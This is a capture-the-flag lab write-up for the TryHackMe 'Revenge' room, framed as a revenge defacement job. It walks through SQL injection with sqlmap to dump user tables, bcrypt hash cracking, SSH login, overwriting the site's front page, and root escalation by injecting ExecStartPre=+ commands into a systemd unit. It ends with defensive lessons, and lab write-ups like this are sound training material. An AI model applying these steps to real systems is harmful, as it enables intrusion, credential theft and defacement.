# TryHackMe: Revenge — Rubber Ducky Inc. Writeup

> **Difficulty:** Medium  
> **Category:** Web Exploitation, SQL Injection, Privilege Escalation  
> **Tools Used:** nmap, gobuster, sqlmap, hashcat, SSH  
> **Author:** Artem  

---

## Scenario

Billy Joel hired us to hack and deface the website of **Rubber Ducky Inc.** — the company that fired him. The mission is simple: break into the server and deface the front page. One critical rule: **DO NOT bring down the site.**

Three flags need to be captured along the way.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -oN full_scan.txt 10.66.140.57
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu) |

Only two open ports — a web server and SSH. The attack surface is clear: exploit the web application, then pivot to SSH access.

### Directory Enumeration

```bash
gobuster dir -u http://10.66.140.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,py -o dirs.txt
```

**Results:**

| Path | Status | Notes |
|------|--------|-------|
| `/index` | 200 | Home page |
| `/products` | 200 | Product listings |
| `/contact` | 200 | Contact form |
| `/login` | 200 | Customer login (non-functional) |
| `/admin` | 200 | Admin login (non-functional) |
| `/static` | 301 | Static assets |
| `/app.py` | 200 | **Source code exposed!** |
| `/requirements.txt` | 200 | **Python dependencies exposed!** |

### Web Application Analysis

The main page revealed staff names — potential usernames for later attacks:

| Role | Name |
|------|------|
| CEO | Vishas Shrinu |
| CFO | Amanda Cummings |
| Head of Sales | Johnny Young |
| VP Sales | Karen Lee |

Both `/login` and `/admin` forms use `action="#"` and only accept GET requests — they are **non-functional decoys**. No POST handler exists in the backend.

---

## Source Code Analysis — The Jackpot

### app.py

Fetching `/app.py` revealed the **complete Flask application source code** — a catastrophic misconfiguration.

**Key findings:**

**1. Database Credentials (Hardcoded)**
```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
```

- MySQL root user password: `PurpleElephants90!`
- Database name: `duckyinc`
- Connection as root = maximum database privileges

**2. Flask Secret Key**
```python
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
```

Could be used to forge Flask session cookies — a backup attack vector.

**3. SQL Injection Vulnerability (Confirmed in Code)**
```python
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
```

The developer even left a comment: *"This should be the vulnerable portion of the application."* User input is concatenated directly into the SQL query via f-string with zero sanitization.

### requirements.txt

Confirmed the tech stack: Flask 1.1.2, Flask-Bcrypt 0.7.1, PyMySQL 0.10.0, SQLAlchemy 1.3.18. Passwords are hashed with **bcrypt**.

---

## Exploitation — SQL Injection

### Confirming the Vulnerability

```bash
# Normal request — returns product page
curl http://10.66.140.57/products/1     # 200 OK

# Injected single quote — triggers server error
curl "http://10.66.140.57/products/1'"  # 500 Internal Server Error
```

The server returned a **500 error** (not 404), confirming the injected quote broke the SQL syntax.

### Automated Exploitation with sqlmap

```bash
sqlmap -u "http://10.66.140.57/products/1" --dbs --batch
```

sqlmap identified **three injection techniques**:

| Technique | Description |
|-----------|-------------|
| Boolean-based blind | Infers data by comparing true/false responses |
| Time-based blind | Extracts data using `SLEEP()` delays |
| **UNION query** | Directly retrieves data in HTTP responses (fastest) |

**Databases found:**

```
[*] duckyinc       ← Target database
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

### Dumping Tables

```bash
sqlmap -u "http://10.66.140.57/products/1" -D duckyinc --tables --batch
```

Three tables discovered: `product`, `user`, `system_user`.

### Extracting User Data

```bash
sqlmap -u "http://10.66.140.57/products/1" -D duckyinc -T user --dump --batch
sqlmap -u "http://10.66.140.57/products/1" -D duckyinc -T system_user --dump --batch
```

**Table: `user`** — 10 entries with bcrypt-hashed passwords and credit card numbers.

### 🚩 Flag 1

In the `user` table, row 6, the `credit_card` field contained:

```
thm{br3ak1ng_4nd_3nt3r1ng}
```

**Table: `system_user`** — 3 entries:

| Username | Email | Hash | Bcrypt Cost |
|----------|-------|------|-------------|
| server-admin | sadmin@duckyinc.org | `$2a$08$GPh...` | **8** |
| kmotley | kmotley@duckyinc.org | `$2a$12$LEE...` | 12 |
| dhughes | dhughes@duckyinc.org | `$2a$12$22x...` | 12 |

Critical observation: `server-admin` uses bcrypt cost factor **8** (256 iterations) vs cost **12** (4,096 iterations) for others — making it **16x faster to crack**.

---

## Cracking the Hash

```bash
echo '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:inuyasha
```

Password cracked: **`inuyasha`** (anime character name, present in rockyou.txt). The low cost factor made this nearly instant.

---

## Initial Access — SSH

```bash
ssh server-admin@10.66.140.57
# Password: inuyasha
```

### Post-Exploitation Enumeration

```bash
id
# uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
```

Membership in the **www-data** group grants write access to web application files — exactly what we need for the defacement mission.

### 🚩 Flag 2

```bash
cat /home/server-admin/flag2.txt
```

```
thm{4lm0st_th3re}
```

---

## Website Defacement

### Locating Web Files

```bash
find / -name "index.html" 2>/dev/null
# /var/www/duckyinc/templates/index.html

ls -la /var/www/duckyinc/templates/index.html
# -rw-rw---- 1 flask-app www-data 5084 index.html
```

File permissions: `rw-rw----` with group `www-data` — we can write to it.

### Replacing the Front Page

```bash
cat > /var/www/duckyinc/templates/index.html << 'EOF'
{% extends "base.html" %}
{% block content %}
<div class="container">
  <div class="section">
    <div class="row center">
      <h1><b>HACKED BY NEO</b></h1>
      <h3>You should have treated me better!</h3>
      <h5>Rubber Ducky Inc. has been pwned</h5>
    </div>
  </div>
</div>
{% endblock %}
EOF
```

The Jinja2 template structure (`{% extends "base.html" %}`) is preserved — the site remains functional with navigation and styling intact, only the content is replaced. **Mission rule respected: site not brought down.**

### Applying the Defacement

Flask caches templates in memory, so the file change alone isn't visible. Checking `sudo -l`:

```bash
sudo -l
# (root) /bin/systemctl start duckyinc.service,
#        /bin/systemctl enable duckyinc.service,
#        /bin/systemctl restart duckyinc.service,
#        /bin/systemctl daemon-reload,
#        sudoedit /etc/systemd/system/duckyinc.service
```

```bash
sudo /bin/systemctl restart duckyinc.service
curl http://localhost/index
# <h1><b>HACKED BY NEO</b></h1> ← Defacement confirmed!
```

---

## Privilege Escalation — systemd Service Exploitation

### The Attack Vector

The `sudo -l` output reveals a powerful privilege escalation path: **`sudoedit /etc/systemd/system/duckyinc.service`** allows editing the systemd unit file that controls the web application.

### Understanding the Original Service File

```ini
[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
```

### Injecting a Root Command

By adding an `ExecStartPre` directive with the `+` prefix, the command runs as **root** regardless of the `User=` setting:

```bash
export EDITOR=nano
sudoedit /etc/systemd/system/duckyinc.service
```

First, we identified the flag file by listing `/root/`:

```ini
ExecStartPre=+/bin/bash -c '/bin/ls /root > /tmp/root_ls.txt'
```

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
cat /tmp/root_ls.txt
# flag3.txt
# snap
```

Then, we copied the flag:

```ini
ExecStartPre=+/bin/cp /root/flag3.txt /tmp/flag3.txt
```

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
cat /tmp/flag3.txt
```

### 🚩 Flag 3

```
thm{m1ss10n_acc0mpl1sh3d}
```

---

## Summary

| # | Flag | Location | Technique |
|---|------|----------|-----------|
| 1 | `thm{br3ak1ng_4nd_3nt3r1ng}` | MySQL `user` table | SQL Injection via `/products/` |
| 2 | `thm{4lm0st_th3re}` | `/home/server-admin/flag2.txt` | SSH with cracked credentials |
| 3 | `thm{m1ss10n_acc0mpl1sh3d}` | `/root/flag3.txt` | Privilege escalation via systemd |

---

## Full Attack Chain

```
Reconnaissance (nmap)
    ↓
Directory Enumeration (gobuster)
    ↓
Source Code Leak (/app.py exposed)
    ↓
SQL Injection (/products/<id> — f-string in query)
    ↓
Database Dump (sqlmap → user credentials + Flag 1)
    ↓
Hash Cracking (hashcat → bcrypt cost 8 → "inuyasha")
    ↓
SSH Access (server-admin → Flag 2)
    ↓
Website Defacement (www-data group → write index.html)
    ↓
Privilege Escalation (sudoedit systemd unit → ExecStartPre=+ → root → Flag 3)
```

---

## Lessons Learned

1. **Never expose source code via web server** — `app.py` gave away database credentials, the secret key, and the exact vulnerable code path.

2. **Always use parameterized SQL queries** — f-strings in SQL queries lead to instant SQL injection. The secure way: `con.execute("SELECT * FROM product WHERE id=:id", {"id": product_id})`.

3. **Use strong bcrypt cost factors** — cost 8 is trivially crackable; OWASP recommends cost 12+ (as of 2024).

4. **Don't reuse credentials** — the MySQL password was in plaintext in the source code; the SSH password was a dictionary word.

5. **Restrict sudo permissions carefully** — allowing `sudoedit` on a systemd service file + `systemctl restart` is equivalent to granting full root access via `ExecStartPre=+`.

6. **Systemd `+` prefix** — the `+` prefix in `ExecStartPre=+/command` executes the command as root regardless of the `User=` directive. This is a well-known privilege escalation technique.
